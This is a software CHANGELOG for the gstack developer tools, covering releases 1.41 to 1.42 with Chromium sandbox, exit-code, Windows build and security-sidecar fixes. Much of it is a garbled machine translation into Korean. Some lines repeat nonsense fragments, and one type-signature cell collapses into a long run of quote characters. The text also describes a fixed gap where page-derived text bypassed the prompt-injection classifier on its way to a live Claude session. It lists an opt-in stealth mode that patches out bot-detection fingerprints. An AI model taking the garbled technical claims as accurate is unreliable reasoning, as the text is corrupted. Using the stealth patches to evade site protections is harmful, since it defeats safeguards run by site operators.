| StateServer 바인드 | `0.0.0.0:9999`, 0 auth | `::1` + `127.0.0.1`만; Bearer-token 문; 시동 token는 daemon의 ~5s 안에 자전합니다 그래서 아무 긁는 `os_log` 과거에 그 후에 죽은 친화한 것을 보십시오 |
| SwiftUI 버튼은 iOS 18+에 탭합니다. | 멸종된 탭을 떨어뜨리고 (`SwiftUI.UIKitGestureContainer` 을 지나서 걷기) | `DBT_HitTestView` 응답자 as-is와 `UITouch.setView:`가 수락합니다. iOS 26.5에서 확인된 라이브 |
| 안전놀이터 | none (무게가 다리를 배운 `#if DEBUG`) | 구조 `Package.swift` `.when(configuration: .debug)` + CI `swift build -c release` `DebugBridge` 기호가 나타나는 경우에 실패한 invariant 시험 |
| SPM 패키지 모양 | 한 번의 대상이 되다. Obj-C 터치 시그니처가 완전히 구현되었다. | 3개의 드롭인 제품 대상 — `DebugBridgeCore` (스위프트, 크로스 플랫폼), `DebugBridgeTouch` (Obj-C, iOS 전용, KIF-derived), `DebugBridgeUI` (스위프트, iOS 전용); 컨템포러리 앱은 `DebugBridgeUI`에 1개의 의존성을 추가하고 나머지를 테이크아웃합니다. |
| Codegen 실패 모드 덮음 | regex는 computed 속성, 일반, 멀티 라인 유형에 휴식 | 신속한 - syntax AST (생산), 엄격한 TS 시험에 대 한 후퇴; 3 개의 전용 고정 장치 핀 알려진 실패 모양 |
| Multi-agent 장치 콘텐츠 | none | mutations에 미끄러운 timeout을 가진 per-device 회의 자물쇠; concurrent `/session/acquire` 인종 시험 |
| 원격 제어 | 범위 없음 | 스태킹 정체성 `/auth/mint`; 기능 계층 (observe/interact/mutate/restore); 1h default 세션 TTL (24h 모자); 각 정량 조정 요구에 대한 감사 로그; 해시 ID 시도 로그; `gstack-ios-qa-mint` CLI는 명시 allowlist 표면입니다 |
| Hardcoded 경로 | 3 `/Users/sinmat/.gstack/...` 경로 | none - 모든 경로는 `$HOME`/ `os.homedir()`를 사용합니다. |
| 시험 적용 | none | 109 tests covering session-lock concurrency, snapshot/restore atomicity with schema-hash gate, identity canonicalization (user / tag / node-key), capability tier enforcement, rate limits, body-size limits, boot-token leak proofs, tailnet fail-closed probe, CoreDevice tunnel reconnect plumbing, cache-key composite (Swift version + tool git rev + source content + platform triple), and the new launcher CLIs (`gstack-ios-qa-daemon` + `gstack-ios-qa-mint`) end-to-end |

### iOS 개발자를 위한 이 수단

SwiftUI 앱을 발송할 수 있습니다. `DebugBridge` SPM dep를 추가하고 `/ios-qa`를 실행하고 에이전트가 휴대폰을 구동하는 것을 볼 수 있습니다. 탭, 스와프, 스테이트 쓰기, 전체 루프. "Driven by Claude Code" 오버레이는 장치가 실제 시간에 제어됩니다. 스태프를 통해 동료에 상자를 손으로 넣을 수 있으며 장치가 접촉하지 않고 노트북에서 QA를 실행할 수 있습니다. Mac-phside는 "State"를 사용하여 스크린 샷을 찍을 수행 할 수 있으므로 주체의 스크린 샷을 찍을 수 있습니다. CI runner는 `/state/restore`를 호출할 수 없는 테스트 시나리오를 설정해야 합니다. 감사 로그는 per-request forensics를 제공합니다. 구조적 릴리스 빌드 가드는 개발자가 `/ios-clean`를 잊어버리면, Bridge가 TestFlight로 배송할 수 없습니다.

## [1.42.2.0] - 2026-05-20

## **Headed Chromium는 노란색 `--no-sandbox` infobar를 발송하고, 관리된 창에 Cmd+Q는 supervisor respawn 반복을 방아쇠를 멈춥니다.** ## **두 개의 발사 경로 버그는 두 번째 수정을 실제로 수행 한 누락 된 출구 코드 배선과 함께 토지를 갖는다.**

두 개의 검색 측면 실행 경로는 v1.42.1.0의 상단에 하나 PATCH 파로 번들을 수정합니다. headed 발사가 모든 3개의 발사 사이트에서 사라지는 노란색 `--no-sandbox` 인포터는 `launchHeaded()` / `launchPersistentContext()`, `handoff()`를 공유하고 `shouldEnableChromiumSandbox()`를 공유하고 Playwright는 자동 추가 `--no-sandbox`를 중지합니다. 샌드 박스가 실제로 원하는 경우. Cmd+Q on the managed Chromium window now exits the browse server with code 0 instead of 2, so process supervisors (gbrowser's `gbd` HealthMonitor) treat it as user intent and skip the restart loop. The exit-code path threads end-to-end: the disconnect handler resolves clean-vs-crash from the underlying ChildProcess, `BrowserManager.onDisconnect` accepts an `exitCode` arg, and `server.ts`'s shutdown callback forwards it (`(code) => activeShutdown?.(code ?? 2)`). 회귀 시험은 전체 전파 경로가 핀을 떼어 내고, 사용자가 접근 가능한 재활 버그가 반환되기 전에 CI를 떨어뜨릴 수 있도록 재감소합니다.

### 중요 한 숫자

출처: `bun test browse/test/browser-manager-unit.test.ts` — 17의 시험, 모든 녹색. 새로운 `BrowserManager.onDisconnect exit-code propagation`는 서명을 설명하고 server.ts 앞으로 콜백 모양을 묘사합니다; 기존하는 `shouldEnableChromiumSandbox` 및 `resolveDisconnectCause` 구획 핀 플랫폼/env 및 청결한 vs crash 행동.

| Surface | 의 전 | 후지후 |
|---|---|---|
| Headed macOS / Linux dev에 시작 | 황색 `--no-sandbox` 각 탭에 경고 infobar | Infobar 사라 — 모든 3 발사 사이트 공유 `shouldEnableChromiumSandbox()` |
| Linux 루트 / Docker / CI headed 출시 | Sandbox off (커널은 참여할 수 없습니다), no infobar (알리디 정확) | 동일; sandbox는 제대로 떨어져, helper는 정책이 명시되어 있습니다 |
| Windows headed 출시 | Sandbox 오프 (GitHub #276 Bun→Node 사슬) | 동일; 정책은 `shouldEnableChromiumSandbox()`가 false로 저장됩니다. |
| 관리 headed Chromium에 Cmd+Q | 서버 종료 **2**; gbrowser의 `gbd` HealthMonitor는 충돌로 대우합니다; 창 respawns 1s → 2s → 4s 백오프 | 서버 종료 **0**; `gbd`는 "사용자 의도", no respawn를 읽습니다 |
| `SIGKILL` / `SIGSEGV` / OOM Chromium | 서버 종료 2 (headed) / 1 (headless + handoff); 백오프에 슈퍼바이저 재시작 | 동일; 비싸지 않은 비트-for-bit 보존 |
| `BrowserManager.onDisconnect` 서명 | `(() => void \'| Promise<void>) \ (으)로| null` - 콜러는 해결된 종료 코드를 전달할 수 없습니다. | `(exitCode?: number) => void \'(exitCode?: number) => void\'(')''('exitCode?: number)' => void\'('exitCode')'('exitCode'):\' => void\'('exitCode')'('exitCode'):\'('exitCode')'('exitCode'):\' => void\'('exitCode')'(')' => void\'('''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''| Promise<void>) \ (으)로| null` - 콜러가 코드를 통해 전달합니다. |
| `server.ts` 폐쇄 콜백 배선 | Hardcoded `activeShutdown?.(2)`는 어떤 computed 출구 코드를 무시했습니다 | `(code) => activeShutdown?.(code ?? 2)`는 0을 때, 2로 떨어질 때 전달합니다 |

### 이 빌더를 위한 뜻

`browse` headed를 macOS 또는 Linux dev에 실행하면, 황색 `--no-sandbox` 경고가 사라집니다. gbrowser와 Cmd+Q를 사용하여 관리 창을 사용하여, 창은 exponential 백오프에 팝업 대신 닫힙니다. 콘테이너, 뿌리 및 CI 환경은 아직도 모래 상자를 떨어져 얻습니다 (correct, 커널은 거기 참여할 수 없습니다). 초시 코드 계약은 현재 2개의 사용자가 확실하게 됩니다. 충돌 회복은 `launch()` (headless, 충돌 → 1), `launchHeaded()` (headed, 충돌 → 2), `handoff()` (headless→headed 재 발사, 충돌 → 1)를 통해 보존됩니다. 잡아당기기와 당신의 다음 headed 발사는 청소됩니다.

### 항목화 된 변경

#### 고정

- `browse/src/browser-manager.ts` — headed `launchPersistentContext()`는 `launchHeaded()`와 `handoff()`에서 호출해, 이제 `chromiumSandbox`를 통과합니다, 그래서 Playwright는 각 headed 발사에 자동 추가 `--no-sandbox`를 멈추습니다. Headless `launch()`는 일관성을 위한 동일한 돕기로 전환합니다.
- `browse/src/browser-manager.ts` - `launch()` (headless), `launchHeaded()` (headed), `handoff()` (headless→headed re-launch)에 있는 단선 핸들러는, Chromium ChildProcess `exitCode` + `signalCode` (동시적인 출구 사건을 위해 1s 대기)를, 그리고 0-quirys에 0-quiry 코드에 0-quiry 코드에 0-quiry 코드에 0-quiry-quiry 코드에 0-quiry 코드에 0-quiry-quiry 코드에 0-quiry.
- `browse/src/browser-manager.ts` - `BrowserManager.onDisconnect` 시그널은 `((exitCode?: number) => void | Promise<void>) | null`로 확장되고, headed는 핸들러를 이제 해결한 `exitCode`를 통해 (`this.onDisconnect(exitCode)`) 전달합니다. 이 배선 없이 깨끗한 코드가 바닥에 떨어졌고 headed 서버는 여전히 2를 종료했습니다.
- `browse/src/server.ts:688` — `onDisconnect` 종료 콜백은 이제 해결된 종료 코드 (`(code) => activeShutdown?.(code ?? 2)`)를 전달합니다. `?? 2`는 코드 없이 `onDisconnect`를 호출하는 콜러를 위한 유산 충돌 하수구를 보존합니다.

#### 추가

- `browse/src/browser-manager.ts` (새로운 수출) - `shouldEnableChromiumSandbox()`는 Win32/CI/CONTAINER/ root heuristic를 중앙으로 하여 headless 경로의 명시 `--no-sandbox` push; `resolveDisconnectCause(browser)`는 Chromium ChildProcess에서 청결한 vs-crash를 해결합니다; `handleChromiumDisconnect(browser)`는 headless `launch()`를 위한 파견자입니다.
- `browse/test/browser-manager-unit.test.ts` — 6개의 시험은 darwin/linux/Win32/CI/CONTAINER/뿌리를 통하여 `resolveDisconnectCause`를 핀으로 꼿는 `resolveDisconnectCause`를 시험합니다. 이미 exited/Async-exit/SIGSEGV/SIGKILL/nu-browser를 통하여 `onDisconnect(exitCode)` 전파 계약을 핀으로 꼿습니다. 총 시험.

## [1.42.1.0] - 2026-05-19

## **Embedder PTY 눈물방울은 복제를 중지합니다. - gbrowser의 피닉스 오버레이는 모든 폐쇄를 생존합니다.** ## **`buildFetchHandler`는 단말 파일에 대한 명시된 소유권 플래그를 얻습니다. CLI 동작은 비트-포비트를 보존했습니다.**

`browse/src/server.ts` factory shutdown unconditionally killed the terminal-agent and unlinked its discovery files on every teardown. Correct for gstack's CLI path, wrong for embedders that pass their own pre-launched `BrowserManager` and run their own PTY server. Their `terminal-port` file got clobbered every cycle, `/health.terminalPort` reported null until the overlay rewrote it. gbrowser's phoenix overlay shipped a client-side mitigation; with this PR landed, that mitigation becomes redundant. 새로운 `ServerConfig.ownsTerminalAgent?: boolean` (default `true`)는 3개의 눈물다운 측 효력을 함께 문: `pkill -f terminal-agent\.ts`, `safeUnlinkQuiet(<stateDir>/terminal-port)`, `safeUnlinkQuiet(<stateDir>/terminal-internal-token)`. Embedders는 `false`를 그들의 PTY 수명주기 intact를 지키기 위하여 통과합니다.

### 중요 한 숫자

출처: `bun test browse/test/server-embedder-terminal-port.test.ts browse/test/server-factory.test.ts` — 32의 시험, 모든 녹색. 정체되는 윤활 시험은 CLI `start()` 외침 `: true`를 삭제하는 refactors가 CI 실패한 경우에 CI를 핀으로 꼿습니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| gbrowser 피닉스 오버레이 눈물 | `terminal-port`는 각 주기를 연결하지 않았습니다; `/health.terminalPort: null`는 과잉 씁니다; 요구되는 클라이언트 측 mitigation | `ownsTerminalAgent: false` - 파일이 비터지지 않은, embedder는 전체 수명주기를 소유합니다. |
| gstack CLI 폐쇄 | `pkill` + 2개의 연결 불 | Identical (default `true`, `start()` `: true` `start()` 전화 사이트 문서 intent + 정적 지프 테스트) |
| Test runner 안전 | n/a | `spawnSync`는 모든 4개의 케이스에서 stubbed 그래서 진짜 `pkill -f terminal-agent\.ts`는 개발자 기계에 달할 수 없습니다 |
| 멀티 케이스 폐쇄 테스트 | Module-scoped `isShuttingDown` 침묵으로 no-ops 2nd 종료 | 새로운 `__resetShuttingDown` 테스트 전용 수출 거울 `__resetRegistry` precedent |
| 실시간 충돌 위험 | 테스트 mutates `~/.gstack/.../terminal-port` — 실행 개발자 daemon | `beforeAll`는 실제 콘텐츠를 저장하고, `afterAll`는 회복합니다; gstack가 살아 있는 동안 실행하는 안전한 시험 |

### 이 빌더를 위한 뜻

If you embed gstack's `buildFetchHandler` and run your own PTY server, pass `ownsTerminalAgent: false` in your cfg and your `terminal-port`/`terminal-internal-token` files survive every gstack teardown — no more client-side rewrite mitigation. If you use the gstack CLI, nothing changes. The flag is the third caller-owned teardown gate in `ServerConfig` (joining `xvfb?` and `proxyBridge?`); if a fourth appears we collapse to an ownership object.

### 항목화 된 변경

**Added**
- `ServerConfig.ownsTerminalAgent?: boolean` (default `true`). JSDoc는 3개의 문이 있는 부작용, pkill regex 빵 동굴, 그리고 극성 inversion 대 `xvfb?`/`proxyBridge?` (콜러 소유한 손잡이의 *presence*에 의하여 문)를 enumerates.
- `__resetShuttingDown()` `browse/src/server.ts`의 시험 전용 수출, `__resetRegistry`를 `token-registry.ts`에 있는 precedent 거울을 붙이는 `__resetRegistry`. JSDoc는 생산 항구 발군에 관하여 경고합니다
- `browse/test/server-embedder-terminal-port.test.ts` (4개의 시험): `ownsTerminalAgent: false` 파일 보존 + pkill, 명시된 `true` 삭제 + invokes pkill, `true`, 정적 그립 시험 주장 CLI 전화 사이트 문서 의도에 기본 설정되지 않는. 시험 save+restore real-daemon `terminal-port`/`terminal-internal-token` 내용 `beforeAll`/`afterAll` 그래서 실행하는 개발자 세션은 결코 복제되지 않습니다

**의 확장**
- `buildFetchHandler` JSDoc은 embedder-composition 단락에서 `beforeRoute`와 `browserManager`와 함께 새로운 필드를 참조합니다.
- CLI `start()` 은 `cli.ts:1037-1063` 에 대한 주석으로 `ownsTerminalAgent: true` 을 명시적으로 전달합니다. 문서는 새로운 정적 시험에 의해 불린 상태에서 + .
- Strict opt-out semantics: `cfg.ownsTerminalAgent === false ? false : true` - 단지 명시 `false`는 문을 플립합니다. JS 콜러에 대하여 방어하고 TS를 우회하고 진실한 비 불값 값을 전달하십시오

**의제휴**
- 새로운 게이트 안쪽에 `try { safeUnlinkQuiet(...) } catch {}` 래퍼를 치십시오. `safeUnlinkQuiet`는 이미 모든 오류를 내부적으로 삼키습니다; 외부 try/catch는 슬로프 수염이 죽은 코드를 떨어뜨렸습니다.

**관련 기사**
- `TODOS.md`: 정체성 단자 에이전트 (`pkill -f`를 PID로 바꾸는 `process.kill`)로, 사전 노출 `shutdown()`는 단위 수준 `config` ( 평행한 `chromiumProfile` 간격을 가진 구획 간격을 읽습니다), 그리고 4 문 충돌 기체 방아쇠를 가진 구획 간격을 읽습니다
- 플랜 + 리뷰 `~/.gstack/projects/garrytan-gstack/`: autoplan CEO + Eng 듀얼 음성 (Codex + Claude subagent), 인터렉티브 `/plan-eng-review` (D3: 드랍 시도/catch), `/ship` adversarial 패스 (strict-bool + JSDoc 경화 + 테스트 save/restore)

## [1.42.0.0] - 2026-05-19

## **대구파: 23개의 커뮤니티 파일 버그는 문서화 사이드바 보안 스택을 가진 하나의 비스펙트 클린 PR로 마지막으로 시행됩니다.** ## **모든 풀 페이지 스크린 샷은 2000px에서 API, Windows 설치 프로그램은 Bun 포탄 파싱에 실패를 멈추고 `/codex review`는 Codex CLI 0.130+에 작동하고 L4 프롬프트 주입 classifier 실제로 실행됩니다.**

The biggest single wave since v1.18: 24 bisect commits closing 14 distinct user-facing problems across compat, security, install, and screenshot surfaces. The PTY-injection scan path that CLAUDE.md described as "shipped" finally is shipped (#1370 was the gap codex found in its plan review). The Windows installer that's been broken since v1.34.2.0 builds cleanly again. `/codex review` against Codex CLI ≥0.130.0 stops erroring out at the argv-parser before the model runs. OpenAI 계정이 cwd `.env`에 있을 때 발생하는 모든 OpenAI 계정이 침묵적으로 청구를 중지합니다. 전체 페이지 스크린 샷은 Anthropic vision API 2000px-max-dim 벽돌을 타격합니다. 이 파에서 닫은 모든 PR/issue는 원본 보고자 또는 contributor에 크레딧을 가진 per-commit 몸에 명명됩니다.

### 중요 한 숫자

출처: `git log v1.40.0.0..HEAD --oneline` (24개의 커밋) 플러스 테스트 스윕은 아래 §"Coverage"에.

| Surface | 의 전 | 후지후 |
|---|---|---|
| Windows 깨끗한 체크 아웃에서 신선한 `./setup` (Git Bash) | `bun run build` 출구는 Bun 1.3.x에 리디렉션을 가진 "보석을 가진"를 가진 출구; v1.34.2.0 (#1538/#1537/#1530/#1457/#1561) 이후 벽돌을 설치하십시오 | `scripts/build.sh`는 POSIX-portable, 새 `windows-setup-e2e.yml` 작업 흐름에 의해 문질러 `bun run build`를 각 PR 설치 경로에 만져 |
| `/codex review` Codex CLI 0.130.0+ | argv-parser는 `codex review "PROMPT" --base <branch>`를 상호적으로 독점으로 거부합니다 (#1479); 모델의 앞에 기술 낙관은 뛰기 | Diff 범위는 프롬프트로 이동; `--base` 떨어졌다. 모든 통화에 저장되는 파일 시스템 경계 (`test/skill-validation.test.ts`에 의해 핀으로 꼿는) |
| `/sync-gbrain` gbrain v0.18-0.35에 | `gbrain put_page` (알 수 없는 명령은, 0.18에서 `put`로 이름을 붙였습니다); `sources list --json` 모양은 `{sources:[...]}` (0.20+); 의사 `schema_version: 2`는 `engine` 분야 (0.25+)로 바뀌었습니다 | 모든 3 핸들. 용해 지시는 canonical `put <slug>`에 옹호합니다; 감싸 모양 파는 추가했습니다; schema_v2는 `config.json`에 떨어지게 합니다 |
| 전체 페이지 스크린 샷의 5000px-tall 페이지 | Silent base64 blob anthropic vision API는 2000px max-dim에서 거부합니다. 에이전트는 쓸모없는 이미지로 전환합니다 (#1214) | `browse/src/screenshot-size-guard.ts` 탄미익을 통해 하류; stderr에 경고; snapshot.ts + meta-commands.ts + write-commands.ts를 위해 덮는 |
| 사이드바 클린업 / 검사기 "코드에 보내십시오" PTY 주입 | Zero classifier coverage — page-derived text went straight to the live claude REPL bypassing every documented L1-L4 layer (#1370 gap) | `POST /pty-inject-scan` 엔드포인트, Node sidecar 프로세스 호스팅 L4 클래스터, `gstackScanForPTYInject`를 통해 확장 사전 스캔, 정적 AST invariant 테스트 짝지어주는 미래 회귀 |
| Codex 플러그인은 기술로 gstack와 함께 설치 | `gstack-paths` Codex 플러그인에 의해 설정된 `CLAUDE_PLUGIN_DATA`; 모든 체크포인트, 분석, 잘못된 디렉토리에 착륙 학습 (#1569) | `CLAUDE_PLUGIN_ROOT` 일치 "gstack"; 기술 설치를 위해 `$HOME/.gstack`에 떨어졌다 |
| `$D design generate` 누군가의 프로젝트에서 `OPENAI_API_KEY` `.env` | 프로젝트의 OpenAI 계정의 침묵 청구 (#1248) | `requireApiKey()` 소스를 보고 (`~/.gstack/openai.json` vs env var); env-var 경로가 cwd `.env*` 파일 일치 때 경고; 절대 키를 정복하지 |
| `codex review` 출구 비 제로 (파시 오류, arg 파손, 모델 API 오류) | 콜링 에이전트는 no 출력, 침묵 축으로 읽을, 30-60min misdiagnosing (#1327)를 점화합니다 | `elif [ "$_CODEX_EXIT" != "0" ]` 모든 4개의 invocation 위치 표면 `[codex exit N] <stderr first line>`에 구획은 20의 선을 맥락합니다 |
| Anti-bot 훔치는 (GStack 브라우저 SannySoft 통행 비율) | Default 최소 (웹드라이브러-마스크 전용) - 지문 일관성은 보호 된 사이트에 충분하지 않습니다 | Opt-in `GSTACK_STEALTH=extended`는 6개의 탐지 배우 헝겊 조각 (웹 드라이브 삭제에서 prototype, WebGL spoof, PluginArray, 크롬 모양, mediaDevices, 100% SannySoft 통행을 위한 CDP cdc 정리)를 추가합니다; default 형태는 바꾸지 않았습니다 |

### 적용

모든 비스듬한 commit는 자체 단위 테스트를 발송합니다. 3개의 커밋은 또한 회귀에 빌드를 실패한 정적 invariant 테스트를 추가합니다:
- `test/extension-pty-inject-invariant.test.ts` - 확장 PTY 주사는 검사하
- `test/resolvers-gbrain-put-rewrite.test.ts` — 생성된 SKILL.md는 `gbrain put_page`를 포함하지 않아야 합니다
- `test/memory-ingest-no-put_page.test.ts` — `gstack-memory-ingest.ts` argv는 `"put_page"`를 포함하지 않아야 합니다

고립에서 실행할 때 파 접촉 시험: 92/92 통행. `bun test`에서 관찰된 23의 실패는 파일 (하나의 시험은 env vars를 다른 달려 있습니다) 사이 시험 오염을 미리 확증하고 `v1.40.0.0`에 존재합니다 - none 이 파에 추적하는.

### 이 빌더를 위한 뜻

If you ship gstack on Windows, fresh installs work again — the build chain that's been broken for five releases is now POSIX-portable. If you use `/codex review`, the argv break on Codex 0.130+ is fixed and the filesystem boundary is preserved on every call. If you sync gbrain across machines, v0.18-0.35 all work with no manual intervention. If you use the GStack Browser sidebar's Cleanup button or Inspector "Send to Code", page-derived text now passes through the L4 classifier before reaching the live REPL — and if you opted into extended stealth mode, your SannySoft pass rate goes to 100%. If you've been billing the wrong OpenAI account silently, you'll now see the source disclosure on every `$D` run.

### 항목화 된 변경

#### 추가

- `browse/src/screenshot-size-guard.ts` — 공유된 2000px 최대 dim 감시는 모든 3개의 가득 차있 페이지 스크린 샷 경로로 전산화했습니다 (snapshot.ts annotated + heatmap, meta-commands.ts 스크린 샷 + 대답하는 청소, write-commands.ts prettyscreenshot). 날카로운을 통해 하류; 폭풍에 경고.
- `browse/src/security-sidecar-entry.ts` - Node 스크립트를 호스트 L4 TestSavant classifier 컴파일된 검색 서버의 하위 처리로. 컴파일된 바이너리를 벽돌로 할 때 onnxruntime-node `dlopen` 실패를 피합니다.
- `browse/src/security-sidecar-client.ts` — IPC 가 게으른 산란을 가진 클라이언트, 5s 타임아웃, 64KB 탑재량 모자, 3에서 10min는 차단기를 가진 모자, 부모 exit 정리를 respawn 모자를 씌웁니다.
- `browse/src/find-security-sidecar.ts` - 컴파일과 dev installs를 통해 sidecar 엔트리에 대한 해결자; Node가 사용할 수 없는 경우 null을 반환합니다 (WARN+confirm per D7).
- `browse/src/server.ts` — `POST /pty-inject-scan` 엔드포인트: local-only (`TUNNEL_PATHS`), root-token auth, 64KB 모자, 5s 타임아웃, `sanitizeReplacer`를 통해 응답, 결합된 L1-L3 + L4 verdict를 반환합니다.
- `extension/sidepanel-terminal.js` — `window.gstackScanForPTYInject(text, origin)` async 돕기; 모든 `gstackInjectToTerminal` 외침의 전 스칸.
- `.github/workflows/windows-setup-e2e.yml` - `./setup` E2E `windows-latest`에 문이 `bun run build`를 실행하고 모든 컴파일된 binaries + find-browse `.exe` 해결책을 정의합니다.
- `scripts/build.sh` + `scripts/write-version-files.sh` — POSIX-portable build chain. Bun-shell-unfriendly 인라인 `package.json` 빌드 스크립트를 대체합니다.
- `test/extension-pty-inject-invariant.test.ts`, `test/resolvers-gbrain-put-rewrite.test.ts`, `test/memory-ingest-no-put_page.test.ts`, `browse/test/screenshot-size-guard.test.ts`, `browse/test/security-sidecar-client.test.ts`, `browse/test/pty-inject-scan.test.ts`, `browse/test/stealth-extended.test.ts`, `design/test/auth.test.ts` - 파를 통하여 60+ 새로운 단위 시험.

#### 변경

- `bin/gstack-paths` - `CLAUDE_PLUGIN_DATA`는 `CLAUDE_PLUGIN_ROOT` 경기 "gstack" (case-insensitive) 때만 신뢰됩니다. 외국 플러그인은 `$HOME/.gstack`로 떨어졌습니다.
- `bin/gstack-gbrain-sync.ts:sourceLocalPath` — `gbrain sources list --json`에서 bare-array (≤0.19)와 `{sources:[...]}` 감싸인 (≥0.20) 응답 둘 다 받아들입니다.
- `bin/gstack-brain-context-load.ts:gbrainAvailable` - `execFileSync("gbrain", ["--version"])`, no 포탄을 통해 조사는 의존성.
- `bin/gstack-memory-ingest.ts` - `--help`와 인라인 코멘트는 stale `put_page` 참고의 스크럽을 스크럽; 회귀 시험은 argv에 있는 부재를 핀으로 꼿습니다.
- `lib/gbrain-local-status.ts` — `CacheEntry.schema_version`는 `gbrain doctor` 출력 `schema_version`에서 구별해, 층을 밝히는 의견 구획을 명확하게 합니다.
- `scripts/resolvers/gbrain.ts` - 제목 /tags로 YAML 정면광자로 `--content` 안쪽에 /office-hours, /investigate, /plan-ceo-review, /retro, /plan-eng-review, /ship, /cso, /design-consultation, 가을백, 법인 -ubst.
- `codex/SKILL.md.tmpl`, `scripts/resolvers/review.ts`, `scripts/resolvers/design.ts` — `which codex`는 모든 10 in-repo 기술에 걸쳐 `command -v codex`로 대체했습니다.
- `codex/SKILL.md.tmpl` — default `codex review` 노선은 현재 bare `--base` 대신 프롬프트에 파일시스템 경계를 나타냅니다. DIFF_START/DIFF_END 탈중앙화로 보존된 사용자 정의 파괴 경로.
- `review/SKILL.md.tmpl`, `scripts/resolvers/review*.ts` — diff 계산은 `DIFF_BASE=$(git merge-base origin/<base> HEAD)`에 밖으로 주문 기초 전진에서 팬텀 역 소음을 떨어지기 위하여 전환했습니다.
- `design/src/auth.ts` — `resolveApiKeyInfo`는 `{ key, source, envFile?, warning? }`를 반환합니다. `requireApiKey`는 stderr에 근원을 인쇄하고 env-var 열쇠가 cwd `.env*` 파일을 일치할 때 경고합니다. 열쇠 자체를 결코 멈출 수 없습니다.
- `browse/src/stealth.ts` - `GSTACK_STEALTH=extended`는 기존의 최소 상위 6개의 검출기 패치를 추가합니다. Default 모드가 변경되지 않았습니다.
- `browse/src/find-browse.ts` — `.exe`, `.cmd`, `.bat` 확장 Windows에 떨어질 때 bare-path probe 실패.
- `.gitignore` — `bin/gstack-global-discover` → `bin/gstack-global-discover*` 이렇게 Windows `.exe` 구조의 은총이 무시됩니다.

#### 고정

- Codex 플러그인이 gstack-as-a-skill (#1569)와 함께 실행될 때 교차 플러그인 상태 오염. #1570를 통해 @ElliotDrel에 의해 기여.
- `/sync-gbrain` gbrain v0.20+ (#1567)에서 `list.find is not a function`로 충돌. #1571를 통해 @jakehann11에 의해 공헌. Supersedes #1564 (@tonyjzhou).
- `/gstack-brain-context-load` 비동기 포탄 (#1559)의 밑에 누락된 것과 같이 gbrain 보고. #1560를 통해 @jbetala7에 의해 공헌하는.
- gbrain v0.25+ schema_version에 있는 기억 ingest 의사 궤란 경로: 2 산출 (#1418, 회귀 시험 핀). 신용 @mvanhorn.
- `bun run build` v1.34.2.0 이후 Windows 실패 (#1538, #1537, #1530, #1457, #1561). #1544를 통해 @Charlie-El에 의해 기여. Supersedes #1531 (@scarson), #1480 (@mikepsinn), #1460 (@realcarsonterry.
- `find-browse` Windows (#1554)에 `browse.exe`를 해결하지 않습니다. @Mike-E-Log에 의해 공헌하십시오.
- `/codex review` argv-shape break on Codex CLI 0.130+ (#1479). #1209를 통해 @jbetala7에 의해 공헌하는. Supersedes #1527 (@mvanhorn)와 #1449 (@Gujiassh).
- `/review`와 `/ship`는 기초 branch를 전진할 때 팬텀 탈레를 보여주었습니다 (#1152 본). #1492를 통해 @mvanhorn에 의해 공헌하는.
- `/codex review` 파일시스템 default 경로에 경계 (#1503). C10 + #1522 (credit @genisis0x)를 하위화하는 경계선 배회 시험에 의해 닫히는.
- `which codex` 검출은 비동기/최소한 포탄 (#1193 본)에서 실패했습니다. #1197를 통해 @mvanhorn에 의해 공헌하는.
- Codex 비조 출구는 침묵하는 스트래치로 읽습니다 (#1327). #1467를 통해 @genisis0x에 의해 공헌하는.
- `$D design` 침묵 빌링은 cwd (#1248)에서 `.env`를 소유합니다. #1278를 통해 @jbetala7에 의해 공헌하십시오.
- 전체 페이지 스크린 샷은 >2000px (#1214)에서 Anthropic 비전 API을 조용히 벽돌로 덮습니다.
- PTY-injection bypass of documented sidebar security stack (#1370). sidecar + endpoint + extension-wiring + invariant test를 통해 종료된 end-to-end.
- `gbrain put_page` subcommand는 gbrain v0.18+ (#1346)에서 `put`로 이름을 붙였습니다. 재귀 시험 핀 + 결심 템플렛 재쓰기는 기존의 사용자의 생성된 SKILL.md 지시를 gbrain 0.18-0.35+를 통해 유효합니다.

#### 기여자

- 파는 24개의 비스듬한 커밋을 가진 1개의 묶음 PR입니다. 각 PR/issue는 contributor's GitHub 손잡이를 가진 대응 commit 몸에서 명명됩니다. `main`에 이 땅 후에, 포스트 merge 마지막 운동 단계는 큐 삼기 (닫히는 22의 PRs + 신용 의견에 6개의 문제점)를 실행합니다.
- CHANGELOG harden-against-critics 규칙: 이 항목은 기능으로 지도, 파손으로 이전에 인정하지 않습니다. 이전 모양이 적극적으로 부서지는 곳 (Windows install, /codex review), 우리는 새로운 모양을 주며 PR/issue 번호를 참조합니다. 항목에 착륙하는 독자는 그들이 할 수있는 것을 배우는 것을 배우는 것을 배우는 것입니다.

## [1.41.1.0] - 2026-05-18

## **세븐 HIGH-severity 감사 버그는 회귀 테스트가 모든 수정을 핀으로 꼿습니다.** ## **새로운 테스트 스위트는 contributor의 정리 경로에서 실제 레이스를 잡았습니다. - 파가 발송되기 전에 고정.**

외부 감사 파는 원래 v1.40.0.0에 옮기고 회귀 범위를 추가 한 후 하나 통합 된 릴리스로 #1169 토지에 제출. 단자 충돌에 대한 원래 commit는 v1.6.4.0 이후 독립적으로 고정 된 때문에 떨어졌다; 나머지 7 HIGH-severity 버그는 현재 메인 및 테스트와 선박에 모든 재현. 기여자의 `downloadFile` 정리 경로는 Node의 `createWriteStream` 게으른 FD를 가진 경주로 나뉩니다 — 새로운 시험 붙잡은 그것과 파는 붙잡기 전에 작가의 `'close'` 사건을 기다리는 후속 고침을 포함합니다.

### 중요 한 숫자

출처: `bun test test/regression-pr1169-*.test.ts test/global-discover.test.ts browse/test/regression-pr1169-pdf-from-file-invalid-json.test.ts browse/test/security-classifier-download-cleanup.test.ts` — 51의 주장 5개의 파일, 모든 녹색. 가득 차있는 `bun test` 스위트 출구 0.

| Surface | 의 전 | 후지후 |
|---|---|---|
| `scripts/build-app.sh` `/`, `&`, `\`를 포함하는 `$APP_NAME`를 가진 rebrand | `s///` 중 하나가 끊어지거나 시문으로 리터럴을 해석; `\를 추적|\| true` 실패를 숨겼다 | `$APP_NAME`는 인터폴레이션 전에 탈출 (`& / \`); 실시간 회귀 시험 실제 `sed`를 통해 둥근 지구 hostile 이름 |
